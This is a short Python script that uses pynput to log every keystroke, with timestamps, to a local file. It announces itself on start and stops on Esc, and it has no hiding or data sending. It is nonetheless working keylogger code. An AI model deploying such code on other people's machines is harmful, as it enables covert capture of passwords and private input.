from pynput import keyboard
import datetime

# The file where keys will be logged
log_file = "keylog.txt"

def on_press(key):
    """
    Callback function that runs every time a key is pressed.
    """
    try:
        # Get the character of the key (e.g., 'a', 'b', '1')
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] Key: {key.char}\n"
        
        # Append to file
        with open(log_file, "a") as f:
            f.write(log_entry)
            
        print(f"Logged: {key.char}")

    except AttributeError:
        # Handle special keys (e.g., Space, Enter, Shift) that don't have a .char attribute
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] Special Key: {key}\n"
        
        with open(log_file, "a") as f:
            f.write(log_entry)
            
        print(f"Logged Special: {key}")

def on_release(key):
    # Stop the keylogger if 'Esc' is pressed
    if key == keyboard.Key.esc:
        return False

print("\n--- Keylogger Started ---")
print("Press 'Esc' to stop logging.\n")

# Start listening to the keyboard
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()